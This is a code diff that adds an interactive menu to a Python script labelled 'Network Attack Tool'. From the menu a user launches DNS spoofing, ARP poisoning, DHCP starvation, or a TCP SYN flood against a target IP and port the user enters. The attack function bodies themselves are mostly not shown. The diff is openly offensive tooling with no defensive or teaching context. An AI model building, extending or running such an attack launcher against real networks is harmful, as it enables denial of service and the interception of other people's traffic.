@@ -2,6 +2,8 @@ import os
 import socket
 import threading
 import time
+import platform
+import clear
 
 # Function to perform a DNS spoofing attack
 def dns_spoofing_attack():
@@ -28,13 +30,49 @@ def tcp_syn_flood_attack(target_ip, target_port):
         sock.close()
 
 # Main program
-if __name__ == '__main__':
-    # Start the attacks
-    threading.Thread(target=dns_spoofing_attack).start()
-    threading.Thread(target=arp_poisoning_attack).start()
-    threading.Thread(target=dhcp_starvation_attack).start()
-    threading.Thread(target=tcp_syn_flood_attack, args=("192.168.1.1", 80)).start()
-
-    print("Attacks started!")
+def main():
     while True:
-        time.sleep(1)
+        clear.clear()
+        print("Welcome to the Network Attack Tool!")
+        print("-------------------------------")
+        print("1. DNS Spoofing Attack")
+        print("2. ARP Poisoning Attack")
+        print("3. DHCP Starvation Attack")
+        print("4. TCP SYN Flood Attack")
+        print("5. Quit")
+
+        choice = input("Enter your choice: ")
+
+        if choice == "1":
+            clear.clear()
+            threading.Thread(target=dns_spoofing_attack).start()
+            print("DNS Spoofing Attack started!")
+            input("Press Enter to continue...")
+        elif choice == "2":
+            clear.clear()
+            threading.Thread(target=arp_poisoning_attack).start()
+            print("ARP Poisoning Attack started!")
+            input("Press Enter to continue...")
+        elif choice == "3":
+            clear.clear()
+            threading.Thread(target=dhcp_starvation_attack).start()
+            print("DHCP Starvation Attack started!")
+            input("Press Enter to continue...")
+        elif choice == "4":
+            clear.clear()
+            target_ip = input("Enter the target IP address: ")
+            target_port = int(input("Enter the target port: "))
+            threading.Thread(target=tcp_syn_flood_attack, args=(target_ip, target_port)).start()
+            print("TCP SYN Flood Attack started!")
+            input("Press Enter to continue...")
+        elif choice == "5":
+            clear.clear()
+            print("Goodbye!")
+            break
+        else:
+            clear.clear()
+            print("Invalid choice. Try again!")
+            input("Press Enter to continue...")
+
+if __name__ == '__main__':
+    main()
